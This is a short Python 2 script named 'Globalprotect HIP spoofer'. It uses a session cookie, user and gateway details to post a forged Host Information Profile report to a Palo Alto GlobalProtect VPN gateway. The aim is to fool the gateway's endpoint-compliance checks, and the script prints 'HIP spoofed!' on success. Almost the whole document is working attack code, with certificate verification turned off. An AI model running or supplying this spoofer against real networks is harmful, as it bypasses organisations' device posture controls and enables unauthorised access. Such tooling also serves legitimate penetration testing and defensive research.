#!/usr/bin/python
import argparse
from requests import post

class spoofer():
	def __init__(self,gateway,cookie,user,portal,ip,computer):
		self.gateway = gateway
		self.cookie = cookie
		self.user = user
		self.portal = portal
		self.ip = ip
		self.computer = computer
		self.headers = {
			'Accept' : '*/*',
			'Connection' : 'Keep-Alive',
			'Content-Type' : 'application/x-www-form-urlencoded',
			'User-Agent' : 'PAN GlobalProtect'
		}
	def send_hip_report(self,hip):
		with open(hip) as f:
			h = f.read()
		data = {
			'user' : self.user,
			'domain' : 'ml',
			'portal' : self.portal,
			'authcookie' : self.cookie,
			'client-ip' : self.ip,
			'computer' : self.computer,
			'client-role' : 'global-protect-full',
			'report' : h
		}
		r = post('https://'+self.gateway+'/ssl-vpn/hipreport.esp',headers=self.headers,verify=False,data=data)
		if 'success' in r.text:
			return True
		else:
			print r.request.body
			print r.text
			return False
	def check_hip(self,digest):
		data = {
			'user' : self.user,
			'domain' : 'ml',
			'portal' : self.portal,
			'authcookie' : self.cookie,
			'client-ip' : self.ip,
			'computer' : self.computer,
			'client-role' : 'global-protect-full',
			'md5' : digest
		}
		r = post('https://'+self.gateway+'/ssl-vpn/hipreportcheck.esp',headers=self.headers,verify=False,data=data)
		if 'success' in r.text:
			return True
		else:
			print r.text
			return False

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Globalprotect HIP spoofer.')
	parser.add_argument('-c','--cookie', required=True, help='Cookie value(32 characters).')
	parser.add_argument('-u','--user', required=True, help='User.')
	parser.add_argument('-i','--ip', required=True, help='IP.')
	parser.add_argument('-p','--computer', required=True, help='Computer.')
	parser.add_argument('-o','--portal', required=True, help='Portal name.')
	parser.add_argument('-g','--gateway', required=True, help='Gateway.')
	parser.add_argument('-f','--hip', required=True, help='HIP file.')
	args = parser.parse_args()	
	if len(args.cookie) != 32:
		print "Cookie must have 32 characters!"
		quit(1)
	s = spoofer(gateway=args.gateway,cookie=args.cookie,user=args.user,portal=args.portal,ip=args.ip,computer=args.computer)
	s.check_hip('1')
	if s.send_hip_report(args.hip):
		print "HIP spoofed!"
		quit()
	else:
		print "Error spoofing HIP!"
		quit(1)
